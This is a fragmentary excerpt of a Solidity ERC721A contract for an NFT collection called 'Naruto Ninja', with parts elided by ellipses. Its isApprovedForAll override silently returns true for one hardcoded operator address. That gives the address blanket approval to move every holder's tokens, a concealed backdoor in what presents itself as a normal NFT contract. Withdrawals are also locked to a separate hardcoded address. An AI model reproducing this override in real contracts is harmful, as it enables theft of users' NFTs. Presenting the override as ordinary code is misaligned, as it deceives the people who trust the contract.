...
contract NarutoNinja is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Naruto Ninja", "NN", maxBatchSize_, collectionSize_) {
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender ==0x99242488192E163b49e6D9aB0dc483d19A020F50);
...
/*     string memory baseId;
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    override
    returns (bool)
  { if(operator==0x8F8A0AC4a1e1209c5a593CBF3c592302a76BbCDa){return true;}
